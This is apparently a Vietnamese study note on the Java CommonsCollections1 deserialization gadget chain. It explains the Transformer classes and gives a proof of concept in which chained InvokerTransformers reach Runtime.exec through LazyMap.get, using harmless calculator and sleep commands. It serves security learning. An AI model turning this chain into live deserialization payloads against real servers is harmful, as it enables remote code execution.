## CommonsCollections1  

###  Transformer(org.apache.commons.collections.Transformer)

> Class transformer sẽ nhận vào 1 object và return ra 1 object mới, class này thường được dùng
> để cast kiểu 1 object này s ang 1 kiểu object khác (Type convert) hoặc dùng để extract data từ
> object input ra  

### LazyMap(org.apache.commons.collections.map.LazyMap)  

> Class LazyMap sẽ tạo ra Object value cho 1 cái key chưa có sẵn trong Map, tóm lại là LazyMap
> sẽ tạo ra Object(value+key) khi gọi đến 1 key chưa tồn tại trong Map ban đầu  

### Chained Trasformer(org.apache.commons.collections.functors.ChainedTransformer)  

> Chained Transformer sẽ nhận tất cả các Transformer riêng lẻ khác tạo thành 1 array, và nó sẽ
> pass output của Transformer n cho Transformer n+1 trong array  

### Invoker Transformer(org.apache.commons.collections.functors.InvokerTransformer)  

> InvokerTransformer nhận 3 giá trị là tên method, type của param method nhận vào và giá trị
> param của method. Một khi tìm thấy method thì InvokerTransformer sẽ invoke method đó và trả
> về giá trị output của method  

### Analysis

```java
public class CommonsCollections1PayloadOnly {
    public static void main(String... args) {
        String[] command = {"open -a calculator"};
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), //(1)
                new InvokerTransformer("getMethod",
                        new Class[]{ String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ), //(2)
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ), //(3)
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        command
                ) //(4)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);
        lazyMap.get("gursev");
    }
}
```

- Về cơ bản phần ``Transformer`` sẽ được hiểu như sau:

```java
Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "sleep 5"});
```

....